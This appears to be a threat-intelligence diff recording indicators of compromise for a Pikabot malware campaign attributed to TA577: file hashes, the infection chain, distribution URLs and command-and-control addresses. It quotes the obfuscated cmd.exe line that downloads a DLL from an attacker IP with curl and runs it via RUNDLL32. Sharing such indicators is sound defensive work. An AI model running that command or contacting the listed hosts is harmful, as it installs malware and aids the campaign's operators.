@@ -1,0 +1,53 @@
+30.10.2023 | Pikabot | TA577 | 1.1.15-ghost
+
+*************************************************
+
+.zip 93907bf6f7e6eb636875cdc82225b3ca0c6abc09ece7d28009c59455c67a4208
+.js 6a5c52a0506c17e85b2e86dcaecb33f9d4464fb8ff3ea27b4e1801bd7d6eb12b
+.dll a9c49ae83be5c3148dc8532b72cbabe232ff1efe3514f5b674510de2a0537282
+
+*************************************************
+
+zip > js > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Accusamusb.js
+
+cmd.exe /c LC || echO LC & pInG LC || cUrl http://188.34.192.184/76DKN6/plast -o %TmP%\LC.sct & pInG -n 3 LC || RUNDLL32 %TmP%\LC.sct, Crash & eXit KCqBSVojsBqrwoS
+
+pInG LC 
+
+pInG -n 3 LC 
+
+RUNDLL32 C:\Users\Admin\AppData\Local\Temp\LC.sct, Crash
+
+*************************************************
+
+distro url
+
+https://obikua.com/tr/?1
+
+*************************************************
+
+.dll distro
+
+http://188.34.192.184/76DKN6/plast
+http://45.76.171.107/ZAiV/guern
+http://149.28.72.201/la6p/rapie
+http://208.167.242.194/Ona65mv/flust
+
+*************************************************
+
+c2's
+
+202.182.121.203:2083
+65.20.82.17:5938
+154.221.30.136:13724
+139.99.216.90:13720
+139.144.97.180:2224
+158.247.210.203:2222
+140.82.56.164:5632
+
+HTTPS Checking Traffic 
+
+https://202.182.121.203:2083/Affixable/Y6yJULzTKrhqZ2?unfearing=NwW8EgEK
+
